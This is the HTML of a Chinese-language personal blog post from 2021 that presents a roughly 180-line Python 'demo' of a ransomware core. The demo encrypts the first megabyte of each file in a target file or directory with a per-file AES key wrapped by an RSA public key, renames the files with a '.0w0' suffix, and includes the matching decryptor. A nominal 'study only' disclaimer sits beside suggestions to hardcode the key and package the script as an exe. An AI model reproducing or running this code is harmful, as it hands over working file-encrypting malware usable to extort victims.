@@ -1,0 +1,624 @@
+<!DOCTYPE html>
+<html lang="zh-cn">
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+  <title>勒索软件结构的一些想法 - 泡枸杞的咸鱼</title>
+  <meta name="renderer" content="webkit" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+<meta name="theme-color" content="#f8f5ec" />
+<meta name="msapplication-navbutton-color" content="#f8f5ec">
+<meta name="apple-mobile-web-app-capable" content="yes">
+<meta name="apple-mobile-web-app-status-bar-style" content="#f8f5ec">
+
+
+<meta name="author" content="dds2333" /><meta name="description" content="近一年勒索病毒越来越活跃，看了些文章后，本菜鸡在摸鱼时用 Python 写了个勒索软件核心的加解密功能 demo ，权当研究学习，请勿用于非法用途。 勒索病毒往往利用" /><meta name="keywords" content="Hugo, theme, even" />
+
+
+
+
+
+
+<meta name="generator" content="Hugo 0.72.0 with theme even" />
+
+
+<link rel="canonical" href="https://dds2333.github.io/post/2021/07/03/ransom_demo/" />
+<link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
+<link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+<link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
+<link rel="manifest" href="/manifest.json">
+<link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5">
+
+
+
+<link href="/sass/main.min.4eb71590ad024de2ebb1b5eef94cbb645b7e63e6b9c4c837355530a75e112ce1.css" rel="stylesheet">
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.1.20/dist/jquery.fancybox.min.css" integrity="sha256-7TyXnr2YU040zfSP+rEcz29ggW4j56/ujTPwjMzyqFY=" crossorigin="anonymous">
+
+
+<meta property="og:title" content="勒索软件结构的一些想法" />
+<meta property="og:description" content="近一年勒索病毒越来越活跃，看了些文章后，本菜鸡在摸鱼时用 Python 写了个勒索软件核心的加解密功能 demo ，权当研究学习，请勿用于非法用途。 勒索病毒往往利用" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://dds2333.github.io/post/2021/07/03/ransom_demo/" />
+<meta property="article:published_time" content="2021-07-03T21:59:08+08:00" />
+<meta property="article:modified_time" content="2021-07-03T21:59:08+08:00" />
+<meta itemprop="name" content="勒索软件结构的一些想法">
+<meta itemprop="description" content="近一年勒索病毒越来越活跃，看了些文章后，本菜鸡在摸鱼时用 Python 写了个勒索软件核心的加解密功能 demo ，权当研究学习，请勿用于非法用途。 勒索病毒往往利用">
+<meta itemprop="datePublished" content="2021-07-03T21:59:08&#43;08:00" />
+<meta itemprop="dateModified" content="2021-07-03T21:59:08&#43;08:00" />
+<meta itemprop="wordCount" content="1039">
+
+
+
+<meta itemprop="keywords" content="密码学," /><meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="勒索软件结构的一些想法"/>
+<meta name="twitter:description" content="近一年勒索病毒越来越活跃，看了些文章后，本菜鸡在摸鱼时用 Python 写了个勒索软件核心的加解密功能 demo ，权当研究学习，请勿用于非法用途。 勒索病毒往往利用"/>
+
+<!--[if lte IE 9]>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/classlist/1.1.20170427/classList.min.js"></script>
+<![endif]-->
+
+<!--[if lt IE 9]>
+  <script src="https://cdn.jsdelivr.net/npm/html5shiv@3.7.3/dist/html5shiv.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/respond.js@1.4.2/dest/respond.min.js"></script>
+<![endif]-->
+
+</head>
+<body>
+  <div id="mobile-navbar" class="mobile-navbar">
+  <div class="mobile-header-logo">
+    <a href="/" class="logo">泡枸杞的咸鱼</a>
+  </div>
+  <div class="mobile-navbar-icon">
+    <span></span>
+    <span></span>
+    <span></span>
+  </div>
+</div>
+<nav id="mobile-menu" class="mobile-menu slideout-menu">
+  <ul class="mobile-menu-list">
+    <a href="/">
+        <li class="mobile-menu-item">主页</li>
+      </a><a href="/post/">
+        <li class="mobile-menu-item">归档</li>
+      </a><a href="/tags/">
+        <li class="mobile-menu-item">标签</li>
+      </a><a href="/categories/">
+        <li class="mobile-menu-item">分类</li>
+      </a><a href="/about/">
+        <li class="mobile-menu-item">关于</li>
+      </a>
+  </ul>
+</nav>
+  <div class="container" id="mobile-panel">
+    <header id="header" class="header">
+        <div class="logo-wrapper">
+  <a href="/" class="logo">泡枸杞的咸鱼</a>
+</div>
+
+<nav class="site-navbar">
+  <ul id="menu" class="menu">
+    <li class="menu-item">
+        <a class="menu-item-link" href="/">主页</a>
+      </li><li class="menu-item">
+        <a class="menu-item-link" href="/post/">归档</a>
+      </li><li class="menu-item">
+        <a class="menu-item-link" href="/tags/">标签</a>
+      </li><li class="menu-item">
+        <a class="menu-item-link" href="/categories/">分类</a>
+      </li><li class="menu-item">
+        <a class="menu-item-link" href="/about/">关于</a>
+      </li>
+  </ul>
+</nav>
+    </header>
+
+    <main id="main" class="main">
+      <div class="content-wrapper">
+        <div id="content" class="content">
+          <article class="post">
+    
+    <header class="post-header">
+      <h1 class="post-title">勒索软件结构的一些想法</h1>
+
+      <div class="post-meta">
+        <span class="post-time"> 2021-07-03 </span>
+        <div class="post-category">
+            <a href="/categories/%E5%AF%86%E7%A0%81%E5%AD%A6/"> 密码学 </a>
+            </div>
+          <span class="more-meta"> 约 1039 字 </span>
+          <span class="more-meta"> 预计阅读 3 分钟 </span>
+        
+      </div>
+    </header>
+
+    <div class="post-toc" id="post-toc">
+  <h2 class="post-toc-title">文章目录</h2>
+  <div class="post-toc-content always-active">
+    
+  </div>
+</div>
+    <div class="post-content">
+      <p>近一年勒索病毒越来越活跃，看了些文章后，本菜鸡在摸鱼时用 Python 写了个勒索软件核心的加解密功能 demo ，权当研究学习，请勿用于非法用途。</p>
+
+<p>勒索病毒往往利用对称密码与非对称密码结合的方式来完成核心的加解密功能，对称密钥用来加密文件，非对称密钥则加密对称密钥，而且加密文件的时候，只加密特定大小数据（如 1M）即可达到原文件不可读的目的。</p>
+
+<p>废话不多说，上代码：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">  1
+</span><span class="lnt">  2
+</span><span class="lnt">  3
+</span><span class="lnt">  4
+</span><span class="lnt">  5
+</span><span class="lnt">  6
+</span><span class="lnt">  7
+</span><span class="lnt">  8
+</span><span class="lnt">  9
+</span><span class="lnt"> 10
+</span><span class="lnt"> 11
+</span><span class="lnt"> 12
+</span><span class="lnt"> 13
+</span><span class="lnt"> 14
+</span><span class="lnt"> 15
+</span><span class="lnt"> 16
+</span><span class="lnt"> 17
+</span><span class="lnt"> 18
+</span><span class="lnt"> 19
+</span><span class="lnt"> 20
+</span><span class="lnt"> 21
+</span><span class="lnt"> 22
+</span><span class="lnt"> 23
+</span><span class="lnt"> 24
+</span><span class="lnt"> 25
+</span><span class="lnt"> 26
+</span><span class="lnt"> 27
+</span><span class="lnt"> 28
+</span><span class="lnt"> 29
+</span><span class="lnt"> 30
+</span><span class="lnt"> 31
+</span><span class="lnt"> 32
+</span><span class="lnt"> 33
+</span><span class="lnt"> 34
+</span><span class="lnt"> 35
+</span><span class="lnt"> 36
+</span><span class="lnt"> 37
+</span><span class="lnt"> 38
+</span><span class="lnt"> 39
+</span><span class="lnt"> 40
+</span><span class="lnt"> 41
+</span><span class="lnt"> 42
+</span><span class="lnt"> 43
+</span><span class="lnt"> 44
+</span><span class="lnt"> 45
+</span><span class="lnt"> 46
+</span><span class="lnt"> 47
+</span><span class="lnt"> 48
+</span><span class="lnt"> 49
+</span><span class="lnt"> 50
+</span><span class="lnt"> 51
+</span><span class="lnt"> 52
+</span><span class="lnt"> 53
+</span><span class="lnt"> 54
+</span><span class="lnt"> 55
+</span><span class="lnt"> 56
+</span><span class="lnt"> 57
+</span><span class="lnt"> 58
+</span><span class="lnt"> 59
+</span><span class="lnt"> 60
+</span><span class="lnt"> 61
+</span><span class="lnt"> 62
+</span><span class="lnt"> 63
+</span><span class="lnt"> 64
+</span><span class="lnt"> 65
+</span><span class="lnt"> 66
+</span><span class="lnt"> 67
+</span><span class="lnt"> 68
+</span><span class="lnt"> 69
+</span><span class="lnt"> 70
+</span><span class="lnt"> 71
+</span><span class="lnt"> 72
+</span><span class="lnt"> 73
+</span><span class="lnt"> 74
+</span><span class="lnt"> 75
+</span><span class="lnt"> 76
+</span><span class="lnt"> 77
+</span><span class="lnt"> 78
+</span><span class="lnt"> 79
+</span><span class="lnt"> 80
+</span><span class="lnt"> 81
+</span><span class="lnt"> 82
+</span><span class="lnt"> 83
+</span><span class="lnt"> 84
+</span><span class="lnt"> 85
+</span><span class="lnt"> 86
+</span><span class="lnt"> 87
+</span><span class="lnt"> 88
+</span><span class="lnt"> 89
+</span><span class="lnt"> 90
+</span><span class="lnt"> 91
+</span><span class="lnt"> 92
+</span><span class="lnt"> 93
+</span><span class="lnt"> 94
+</span><span class="lnt"> 95
+</span><span class="lnt"> 96
+</span><span class="lnt"> 97
+</span><span class="lnt"> 98
+</span><span class="lnt"> 99
+</span><span class="lnt">100
+</span><span class="lnt">101
+</span><span class="lnt">102
+</span><span class="lnt">103
+</span><span class="lnt">104
+</span><span class="lnt">105
+</span><span class="lnt">106
+</span><span class="lnt">107
+</span><span class="lnt">108
+</span><span class="lnt">109
+</span><span class="lnt">110
+</span><span class="lnt">111
+</span><span class="lnt">112
+</span><span class="lnt">113
+</span><span class="lnt">114
+</span><span class="lnt">115
+</span><span class="lnt">116
+</span><span class="lnt">117
+</span><span class="lnt">118
+</span><span class="lnt">119
+</span><span class="lnt">120
+</span><span class="lnt">121
+</span><span class="lnt">122
+</span><span class="lnt">123
+</span><span class="lnt">124
+</span><span class="lnt">125
+</span><span class="lnt">126
+</span><span class="lnt">127
+</span><span class="lnt">128
+</span><span class="lnt">129
+</span><span class="lnt">130
+</span><span class="lnt">131
+</span><span class="lnt">132
+</span><span class="lnt">133
+</span><span class="lnt">134
+</span><span class="lnt">135
+</span><span class="lnt">136
+</span><span class="lnt">137
+</span><span class="lnt">138
+</span><span class="lnt">139
+</span><span class="lnt">140
+</span><span class="lnt">141
+</span><span class="lnt">142
+</span><span class="lnt">143
+</span><span class="lnt">144
+</span><span class="lnt">145
+</span><span class="lnt">146
+</span><span class="lnt">147
+</span><span class="lnt">148
+</span><span class="lnt">149
+</span><span class="lnt">150
+</span><span class="lnt">151
+</span><span class="lnt">152
+</span><span class="lnt">153
+</span><span class="lnt">154
+</span><span class="lnt">155
+</span><span class="lnt">156
+</span><span class="lnt">157
+</span><span class="lnt">158
+</span><span class="lnt">159
+</span><span class="lnt">160
+</span><span class="lnt">161
+</span><span class="lnt">162
+</span><span class="lnt">163
+</span><span class="lnt">164
+</span><span class="lnt">165
+</span><span class="lnt">166
+</span><span class="lnt">167
+</span><span class="lnt">168
+</span><span class="lnt">169
+</span><span class="lnt">170
+</span><span class="lnt">171
+</span><span class="lnt">172
+</span><span class="lnt">173
+</span><span class="lnt">174
+</span><span class="lnt">175
+</span><span class="lnt">176
+</span><span class="lnt">177
+</span><span class="lnt">178
+</span><span class="lnt">179
+</span><span class="lnt">180
+</span><span class="lnt">181
+</span><span class="lnt">182
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-fallback" data-lang="fallback"># -*- coding: utf-8 -*-
+# Time: 2021/06/30
+# Author: dds2333
+
+from Crypto.Cipher import AES, PKCS1_OAEP
+from Crypto.PublicKey import RSA
+import secrets
+import base64
+import os
+import sys
+import shutil
+import parser
+import argparse
+
+#encrypt aes key
+def rsaEncryptSecret(plain, publicKey):
+    public_key = get_key(publicKey)
+    cipher_rsa = PKCS1_OAEP.new(public_key)
+    cipher_text = cipher_rsa.encrypt(plain)
+    return cipher_text
+
+#decrypt aes key
+def rsaDecryptSecret(cipher, privateKey):
+    private_key = get_key(privateKey)
+    cipher_rsa = PKCS1_OAEP.new(private_key)
+    decryptedBytestrings = cipher_rsa.decrypt(cipher)
+    return decryptedBytestrings
+
+#aes encrypt
+def symEncryptFile(publicKey, file):
+    aes_key = generateKey()
+    #key = bytes.fromhex(hex_key)
+
+    #使用 RSA 公钥加密 AES 密钥
+    encriptedKey = rsaEncryptSecret(aes_key, publicKey)
+    #定义缓冲区大小为 1M (1048576 bits)
+    buffer_size = 1048576
+    #加密文件后缀定义为 &#34;0w0&#34;
+    if file.endswith(&#34;.&#34; + &#39;0w0&#39;):
+        print(&#39;File is already encrypted, skipping&#39;)
+        return
+    input_file = open(file, &#39;r+b&#39;)
+    print(&#34;Encrypting file: &#34;+ file)
+    output_file = open(file + &#39;.&#39; + &#39;0w0&#39;, &#39;w+b&#39;)
+    #使用 AES CFB 模式
+    cipher_encrypt = AES.new(aes_key, AES.MODE_CFB)
+    #文件指针指向文件开头
+    input_file.seek(0)
+    #读取 1M 用来加密
+    buffer = input_file.read(buffer_size)
+    ciphered_bytes = cipher_encrypt.encrypt(buffer)
+    input_file.seek(0)
+    input_file.write(ciphered_bytes)
+
+    #将文件指针移到文件末尾
+    input_file.seek(0, os.SEEK_END)
+    #input_file.write(base64.b64decode(encriptedKey))
+    #写入加密的 AES 密钥
+    input_file.write(encriptedKey)
+    #再指向末尾
+    input_file.seek(0, os.SEEK_END)
+    #写入初始向量 iv
+    input_file.write(cipher_encrypt.iv)
+    input_file.close()
+    #os.rename(file, file + &#34;.&#34; + &#39;0w0&#39;)
+    #将原文件重命名，此处在 win 使用 os.rename 会报错，改为使用 shutil
+    shutil.move(file, file + &#34;.&#34; + &#39;0w0&#39;)
+
+#aes decrypt
+def symDecryptFile(privateKey, file):
+    #缓冲区, 1M
+    buffer_size = 1048576
+    if file.endswith(&#34;.&#34; + &#39;0w0&#39;):
+        out_filename = file[:-(len(&#39;0w0&#39;) + 1)]
+        print(&#34;Decrypting file: &#34; + file)
+    else:
+        print(&#39;File is not encrypted&#39;)
+        return
+    input_file = open(file, &#39;r+b&#39;)
+    #读取 iv,16 字节
+    input_file.seek(-16, os.SEEK_END)
+    iv = input_file.read(16)
+    #RSA 密文占 256 字节，加上 16字节的 iv
+    input_file.seek(-272, os.SEEK_END)
+    secret = input_file.read(256)
+    #解密得到 AES 密钥
+    aes_key = rsaDecryptSecret(secret, privateKey)
+    #使用 AES CFB 模式
+    cipher_encrypt = AES.new(aes_key, AES.MODE_CFB, iv=iv)
+    #从文件开头读取 1M 大小的密文并解密
+    input_file.seek(0)
+    buffer = input_file.read(buffer_size)
+    decrypted_bytes = cipher_encrypt.decrypt(buffer)
+    #写入明文
+    input_file.seek(0)
+    input_file.write(decrypted_bytes)
+    #将文件指针移至末尾往前 272 处，并截断文件
+    input_file.seek(-272, os.SEEK_END)
+    input_file.truncate()
+    input_file.close()
+    #os.rename(file, out_filename)
+    #重命名文件
+    shutil.move(file, out_filename)
+
+#import key
+def get_key(key_encoded):
+    #pub_key = RSA.import_key(key_encoded, None)
+    f = open(key_encoded)
+    s = f.read()
+    key = RSA.import_key(s)
+    return key
+
+#generate aes kry
+def generateKey():
+    #sym_key = secrets.token_hex(32)
+    sym_key = secrets.token_bytes(32) #生成 32 字节密钥
+    return sym_key
+
+def main():
+
+    #2048 bits rsa pub key
+#     pub = &#34;&#34;&#34;-----BEGIN PUBLIC KEY-----
+# MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAiIkTnAgp8i0gO8uwhcE1
+# vhognAlUKwG3glsMrvoAQiraB6IJgT+OLqfg59mgMB0KctKsiHcPojcy/6Z4yLOS
+# GQxKnvgD69jGP0kd5gwpo/b4oZLouAvlkl9++pYnFsHtcy1soGk9GWe9hEORwcq6
+# 61YELJUlhm6jFev50xlsAYI/rhR9F/uePLVpxi3LF2n23ClP3rZnwDKKp1rdMalV
+# ff6ZDtjIVP5uKrgQrVq1FpkVr0Na9XXo3aFlgpY95SH926Y2hyvhDuVXcUa516ts
+# qgBkT+oqoCgsVCwqc8Pf2IW80BbC86HzGQVlWRQzHCldI29YosrBZPaJyc4oMoTu
+# /wIDAQAB
+# -----END PUBLIC KEY-----&#34;&#34;&#34;
+
+    parser = argparse.ArgumentParser()
+    parser.add_argument(&#34;--dest&#34;, &#34;-d&#34;, help=&#34;File or directory to encrypt/decrypt&#34;, dest=&#34;destination&#34;, default=&#34;none&#34;, required=True)
+    parser.add_argument(&#34;--action&#34;, &#34;-a&#34;, help=&#34;Action (encrypt/decrypt)&#34;, dest=&#34;action&#34;, required=True)
+    parser.add_argument(&#34;--pem&#34;,&#34;-p&#34;, help=&#34;Public/Private key&#34;, dest=&#34;key&#34;, required=True)
+    args = parser.parse_args()
+    act = args.action
+
+    #文件
+    if os.path.isfile(args.destination):
+        file_path = args.destination
+        if act == &#34;encrypt&#34;:           
+            symEncryptFile(args.key, file_path)
+        elif act == &#34;decrypt&#34;:
+            symDecryptFile(args.key, file_path)
+    #目录
+    else:
+        file_list = []
+        dir_path = args.destination
+        for root,dirs,files in os.walk(dir_path):
+            for f in files:
+                dirPath =os.path.join(root, f)
+                if f == &#34;ransom_demo.py&#34;:
+                    pass
+                else:
+                    file_list.append(dirPath)
+
+        file_nums = len(file_list)
+        if file_nums &lt; 1:
+            return
+        else:
+            for li in file_list:
+                if act == &#34;encrypt&#34;:
+                    symEncryptFile(args.key, li)
+                elif act == &#34;decrypt&#34;:
+                    symDecryptFile(args.key, li)
+                     
+    # key = RSA.generate(2048)
+    # private_key = key.export_key()
+    # file_out = open(&#34;private1.pem&#34;, &#34;wb&#34;)
+    # file_out.write(private_key)
+    # file_out.close()
+
+    # public_key = key.publickey().export_key()
+    # file_out = open(&#34;public1.pem&#34;, &#34;wb&#34;)
+    # file_out.write(public_key)
+    # file_out.close()
+
+    print(&#34;\naha!&#34;)
+
+if __name__ == &#39;__main__&#39;:
+    main()</code></pre></td></tr></table>
+</div>
+</div>
+<p>以上只是实现了核心的功能，还有很多可以改进的地方，比如文件夹递归、公钥硬编码等，另外可用 pyinstaller 将 python 代码打包成 exe 😎</p>
+
+    </div>
+
+    <div class="post-copyright">
+  <p class="copyright-item">
+    <span class="item-title">文章作者</span>
+    <span class="item-content">dds2333</span>
+  </p>
+  <p class="copyright-item">
+    <span class="item-title">上次更新</span>
+    <span class="item-content">
+        2021-07-03
+        
+    </span>
+  </p>
+  
+  
+</div>
+<footer class="post-footer">
+      <div class="post-tags">
+          <a href="/tags/%E5%AF%86%E7%A0%81%E5%AD%A6/">密码学</a>
+          </div>
+      <nav class="post-nav">
+        
+        <a class="next" href="/post/2021/05/04/hardware_audio/">
+            <span class="next-text nav-default">台式电脑机箱前面板音频杂音的解决方法</span>
+            <span class="next-text nav-mobile">下一篇</span>
+            <i class="iconfont icon-right"></i>
+          </a>
+      </nav>
+    </footer>
+  </article>
+        </div>
+        
+
+  
+
+  
+
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="social-links">
+      <a href="mailto:dds2014@live.cn" class="iconfont icon-email" title="email"></a>
+      <a href="https://github.com/dds2333" class="iconfont icon-github" title="github"></a>
+  <a href="https://dds2333.github.io/index.xml" type="application/rss+xml" class="iconfont icon-rss" title="rss"></a>
+</div>
+
+<div class="copyright">
+  <span class="power-by">
+    由 <a class="hexo-link" href="https://gohugo.io">Hugo</a> 强力驱动
+  </span>
+  <span class="division">|</span>
+  <span class="theme-info">
+    主题 - 
+    <a class="theme-link" href="https://github.com/olOwOlo/hugo-theme-even">Even</a>
+  </span>
+
+  
+
+  <span class="copyright-year">
+    &copy; 
+    2019 - 
+    2021
+    <span class="heart">
+      <i class="iconfont icon-heart"></i>
+    </span>
+    <span class="author">dds2333</span>
+  </span>
+</div>
+    </footer>
+
+    <div class="back-to-top" id="back-to-top">
+      <i class="iconfont icon-up"></i>
+    </div>
+  </div>
+  
+  <script src="https://cdn.jsdelivr.net/npm/jquery@3.2.1/dist/jquery.min.js" integrity="sha256-hwg4gsxgFZhOsEEamdOYGBf13FyQuiTwlAQgxVSNgt4=" crossorigin="anonymous"></script>
+  <script src="https://cdn.jsdelivr.net/npm/slideout@1.0.1/dist/slideout.min.js" integrity="sha256-t+zJ/g8/KXIJMjSVQdnibt4dlaDxc9zXr/9oNPeWqdg=" crossorigin="anonymous"></script>
+  <script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.1.20/dist/jquery.fancybox.min.js" integrity="sha256-XVLffZaxoWfGUEbdzuLi7pwaUJv1cecsQJQqGLe7axY=" crossorigin="anonymous"></script>
+
+
+
+<script type="text/javascript" src="/js/main.min.d7b7ada643c9c1a983026e177f141f7363b4640d619caf01d8831a6718cd44ea.js"></script>
+  <script type="text/javascript">
+    window.MathJax = {
+      tex2jax: {inlineMath: [['$','$'], ['\\(','\\)']]},
+      TeX: {equationNumbers: {autoNumber: "AMS"}},
+      showProcessingMessages: false,
+      messageStyle: 'none'
+    };
+  </script>
+  <script async src="https://cdn.jsdelivr.net/npm/mathjax@2.7.5/MathJax.js?config=TeX-MML-AM_CHTML"  integrity="sha256-nvJJv9wWKEm88qvoQl9ekL2J+k/RWIsaSScxxlsrv8k=" crossorigin="anonymous"></script>
+
+
+
+
+
+
+
+
+</body>
+</html>
